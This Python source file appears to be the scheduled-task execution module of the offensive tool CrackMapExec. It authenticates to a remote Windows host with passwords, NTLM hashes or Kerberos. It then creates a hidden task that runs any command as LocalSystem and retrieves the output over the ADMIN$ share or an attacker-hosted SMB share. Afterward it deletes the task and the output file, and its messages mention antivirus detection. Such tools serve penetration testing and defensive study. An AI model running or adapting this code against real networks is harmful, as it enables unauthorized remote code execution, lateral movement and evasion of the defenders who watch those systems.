#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from cme.helpers.misc import gen_random_string
from time import sleep


class TSCH_EXEC:
    def __init__(
        self,
        target,
        share_name,
        username,
        password,
        domain,
        doKerberos=False,
        aesKey=None,
        kdcHost=None,
        hashes=None,
        logger=None,
        tries=None,
        share=None
    ):
        self.__target = target
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__share_name = share_name
        self.__lmhash = ""
        self.__nthash = ""
        self.__outputBuffer = b""
        self.__retOutput = False
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__tries = tries
        self.logger = logger

        if hashes is not None:
            # This checks to see if we didn't provide the LM Hash
            if hashes.find(":") != -1:
                self.__lmhash, self.__nthash = hashes.split(":")
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ""

        stringbinding = r"ncacn_np:%s[\pipe\atsvc]" % self.__target
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)

        if hasattr(self.__rpctransport, "set_credentials"):
            # This method exists only for selected protocol sequences.
            self.__rpctransport.set_credentials(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                self.__aesKey,
            )
            self.__rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

    def execute(self, command, output=False):
        self.__retOutput = output
        self.execute_handler(command)
        return self.__outputBuffer

    def output_callback(self, data):
        self.__outputBuffer = data

    def gen_xml(self, command, tmpFileName, fileless=False):
        xml = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>cmd.exe</Command>
"""
        if self.__retOutput:
            if fileless:
                local_ip = self.__rpctransport.get_socket().getsockname()[0]
                argument_xml = f"      <Arguments>/C {command} &gt; \\\\{local_ip}\\{self.__share_name}\\{tmpFileName} 2&gt;&amp;1</Arguments>"
            else:
                argument_xml = f"      <Arguments>/C {command} &gt; %windir%\\Temp\\{tmpFileName} 2&gt;&amp;1</Arguments>"

        elif self.__retOutput is False:
            argument_xml = f"      <Arguments>/C {command}</Arguments>"

        self.logger.debug("Generated argument XML: " + argument_xml)
        xml += argument_xml

        xml += """
    </Exec>
  </Actions>
</Task>
"""
        return xml

    def execute_handler(self, command, fileless=False):
        dce = self.__rpctransport.get_dce_rpc()
        if self.__doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)

        dce.set_credentials(*self.__rpctransport.get_credentials())
        dce.connect()
        # dce.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)
        
        tmpName = gen_random_string(8)
        tmpFileName = tmpName + ".tmp"

        xml = self.gen_xml(command, tmpFileName, fileless)

        self.logger.info(f"Task XML: {xml}")
        taskCreated = False
        self.logger.info(f"Creating task \\{tmpName}")
        try:
            # windows server 2003 has no MSRPC_UUID_TSCHS, if it bind, it will return abstract_syntax_not_supported
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.bind(tsch.MSRPC_UUID_TSCHS)
            tsch.hSchRpcRegisterTask(dce, f"\\{tmpName}", xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
        except Exception as e:
            if e.error_code and hex(e.error_code) == "0x80070005":
                self.logger.fail("ATEXEC: Create schedule task got blocked.")
            else:
                self.logger.fail(str(e))
            return
        else:
            taskCreated = True

        self.logger.info(f"Running task \\{tmpName}")
        tsch.hSchRpcRun(dce, f"\\{tmpName}")

        done = False
        while not done:
            self.logger.debug(f"Calling SchRpcGetLastRunInfo for \\{tmpName}")
            resp = tsch.hSchRpcGetLastRunInfo(dce, f"\\{tmpName}")
            if resp["pLastRuntime"]["wYear"] != 0:
                done = True
            else:
                sleep(2)

        self.logger.info(f"Deleting task \\{tmpName}")
        tsch.hSchRpcDelete(dce, f"\\{tmpName}")
        taskCreated = False

        if taskCreated is True:
            tsch.hSchRpcDelete(dce, "\\%s" % tmpName)

        if self.__retOutput:
            if fileless:
                while True:
                    try:
                        with open(os.path.join("/tmp", "cme_hosted", tmpFileName), "r") as output:
                            self.output_callback(output.read())
                        break
                    except IOError:
                        sleep(2)
            else:
                peer = ":".join(map(str, self.__rpctransport.get_socket().getpeername()))
                smbConnection = self.__rpctransport.get_smb_connection()
                tries = 1
                while True:
                    try:
                        self.logger.info(f"Attempting to read ADMIN$\\Temp\\{tmpFileName}")
                        smbConnection.getFile("ADMIN$", f"Temp\\{tmpFileName}", self.output_callback)
                        break
                    except Exception as e:
                        if tries >= self.__tries:
                            self.logger.fail(f'ATEXEC: Get output file error, maybe got detected by AV software, please increase the number of tries with the option "--get-output-tries". If it\'s still failing maybe something is blocking the schedule job, try another exec method')
                            break
                        if str(e).find("STATUS_BAD_NETWORK_NAME") >0 :
                            self.logger.fail(f'ATEXEC: Get ouput failed, target has blocked ADMIN$ access (maybe command executed!)')
                            break
                        if str(e).find("SHARING") > 0 or str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") >= 0:
                            sleep(3)
                            tries += 1
                        else:
                            self.logger.debug(str(e))

                if self.__outputBuffer:
                    self.logger.debug(f"Deleting file ADMIN$\\Temp\\{tmpFileName}")
                    smbConnection.deleteFile("ADMIN$", f"Temp\\{tmpFileName}")

        dce.disconnect()
